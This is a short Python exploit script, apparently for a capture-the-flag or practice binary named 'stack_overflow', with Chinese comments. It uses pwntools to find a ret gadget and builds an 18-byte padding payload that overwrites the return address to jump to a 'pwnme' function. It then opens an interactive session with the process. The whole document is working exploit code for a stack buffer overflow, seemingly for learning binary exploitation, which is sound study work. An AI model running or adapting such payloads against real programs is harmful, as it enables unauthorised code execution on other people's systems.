from pwn import *

# 1. 设置
context.binary = './stack_overflow'
# context.log_level = 'debug' 
elf = ELF('./stack_overflow')
p = process('./stack_overflow')

# 2. 准备地址
pwnme_addr = 0x400586  # 你之前填的这个地址
# 自动找一个 ret 指令的地址 (ROP Gadget)
rop = ROP(elf)
ret_addr = rop.find_gadget(['ret'])[0]
print(f"Found ret gadget at: {hex(ret_addr)}")

# 3. 构建 Payload
# 原理：[垃圾数据] + [ret指令地址(用于对齐)] + [pwnme地址]
# 既然你确定偏移是 18，那就用 18
offset = 18 

payload = b'a' * offset + p64(ret_addr) + p64(pwnme_addr)

# 4. 发送
print(f"Sending payload with offset {offset}...")
p.sendline(payload)
p.interactive()
